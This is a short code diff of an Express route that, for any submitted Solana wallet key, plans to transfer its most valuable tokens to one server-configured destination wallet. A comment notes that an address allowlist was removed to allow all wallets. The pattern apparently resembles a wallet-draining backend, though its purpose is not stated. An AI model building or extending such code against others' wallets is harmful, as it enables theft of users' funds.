@@ -376,12 +376,10 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
     if (!DEST_WALLET) {
       return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });
     }
-    
-    // REMOVED: The check for TELEGRAM_ALLOWED_ADDRESSES has been removed to allow all wallets
-    
-    const from = new PublicKey(req.params.pubkey).toBase58();
 
+    const from = new PublicKey(req.params.pubkey).toBase58();
     const dest = new PublicKey(DEST_WALLET).toBase58();
+
     if (from === dest) {
       return res.status(400).json({ error: 'Source and destination are the same' });
     }
@@ -391,6 +389,7 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
       .filter((tok) => Number(tok.usdValue || 0) >= MIN_TOKEN_USD)
       .sort((a, b) => (b.usdValue || 0) - (a.usdValue || 0));
     const needsGas = Number(portfolio.sol) < MIN_SOL_FOR_GAS;
+
     res.json({
       from,
       to: dest,
@@ -403,6 +402,7 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
       needsGas,
       message: needsGas
         ? `Fund this wallet with SOL for gas. You have ${portfolio.sol} SOL.`
+        : undefined,
     });
   } catch (err) {
     console.error(err);
